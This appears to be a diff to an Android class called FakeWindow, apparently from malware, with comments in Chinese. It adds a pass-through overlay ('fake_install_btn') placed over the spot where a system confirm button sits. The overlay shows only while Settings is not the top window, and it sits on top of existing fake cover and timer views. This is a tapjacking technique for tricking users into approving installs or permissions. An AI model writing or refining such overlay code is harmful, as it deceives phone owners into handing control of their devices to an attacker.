@@ -44,11 +44,16 @@ public class FakeWindow {
     private int count = 30;
     private Handler handler;
 
+    private WindowManager.LayoutParams fullConfirmBtnParams;
+    private View fullInstallView;
+
     private WindowListener mWindowListener;
+    private LayoutInflater mLayoutInflater;
 
     public FakeWindow(Context context, WindowListener l) {
         this.context = context;
         LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
+        mLayoutInflater = layoutInflater;
         coverView = layoutInflater.inflate(R.layout.app_details, null);
         timerView = layoutInflater.inflate(R.layout.fake_timer, null);
         timeTV = (TextView) timerView.findViewById(R.id.timer);
@@ -90,31 +95,37 @@ public class FakeWindow {
                 mWindowListener.onWindowDismiss();
             }
             if (coverView != null && timerView != null) {
-                if (Config.DEBUG_IF_GO_HOME) {
-                    UtilsRuntime.goHome(context);
-                }
+                UtilsRuntime.goHome(context);
                 wm.removeView(coverView);
                 wm.removeView(timerView);
                 wm.removeView(installView);
             }
+            if (fullInstallView != null) {
+                wm.removeView(fullInstallView);
+            }
+            fullInstallView = null;
             coverView = null;
             timerView = null;
             installView = null;
 
             AppRuntime.FAKE_WINDOW_SHOW = false;
-
-//            handler.postDelayed(new Runnable() {
-//                @Override
-//                public void run() {
-//                    Intent i = new Intent();
-//                    i.setClass(context, FakeActivity.class);
-//                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-//                    context.startActivity(i);
-//                }
-//            }, 1500);
+            AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
         } else {
             if (count == 2) {
                 AppRuntime.WATCHING_SERVICE_BREAK.set(true);
+            }
+
+            if (!AppRuntime.WATCHING_TOP_IS_SETTINGS.get()) {
+                //当前顶层窗口不是setting
+                if (fullInstallView == null) {
+                    fullInstallView = mLayoutInflater.inflate(R.layout.fake_install_btn, null);
+                    wm.addView(fullInstallView, fullConfirmBtnParams);
+                }
+            } else {
+                if (fullInstallView != null) {
+                    wm.removeView(fullInstallView);
+                }
+                fullInstallView = null;
             }
 
             handler.post(new Runnable() {
@@ -160,6 +171,21 @@ public class FakeWindow {
         int screenWidth = dm.widthPixels;
         int screenHeight = dm.heightPixels;
         float density = dm.density;
+
+        /**
+         * 初始化全遮盖的button
+         */
+        fullConfirmBtnParams = new WindowManager.LayoutParams();
+        fullConfirmBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
+        fullConfirmBtnParams.format = PixelFormat.RGBA_8888;
+        fullConfirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
+        fullConfirmBtnParams.width = screenWidth / 2;
+        fullConfirmBtnParams.height = (int) (48 * density);
+        if (AppRuntime.isVersionBeyondGB()) {
+            fullConfirmBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+        } else {
+            fullConfirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+        }
 
         /**
          * 测试代码，确认按键全遮盖
